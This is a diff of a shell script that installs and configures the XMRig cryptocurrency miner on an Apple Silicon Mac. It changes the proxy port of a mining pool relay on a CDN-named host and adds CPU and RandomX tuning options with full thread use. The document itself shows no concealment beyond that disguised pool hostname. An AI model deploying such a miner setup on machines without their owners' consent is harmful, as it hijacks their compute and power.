@@ -12,8 +12,8 @@ NETWORK="TRC20"
 WORKER="m2mac"
 # unMineable referral code gives reduced 0.75% fee (default is 1%)
 REF_CODE="jaso-xmr"
-POOL_HOST="cdn.soumalya.in"  # VPS proxy — port 3957 routes to rx.unmineable.com
-POOL_PORT="3957"
+POOL_HOST="cdn.soumalya.in"  # VPS proxy port 3956 → rx.unmineable.com:3333
+POOL_PORT="3956"
 XMRIG_VERSION="6.26.0"
 XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-macos-arm64.tar.gz"
 
@@ -87,13 +87,19 @@ cat > "$CONFIG_PATH" << CONF
   "randomx": {
     "mode": "light",
     "1gb-pages": false,
-    "numa": false
+    "numa": false,
+    "wrmsr": false,
+    "rdmsr": false
   },
   "cpu": {
     "enabled": true,
-    "max-threads-hint": 100,
+    "huge-pages": false,
+    "huge-pages-jit": false,
+    "hw-aes": true,
     "priority": 5,
-    "asm": true
+    "memory-pool": false,
+    "asm": true,
+    "max-threads-hint": 100
   },
   "pools": [
     {
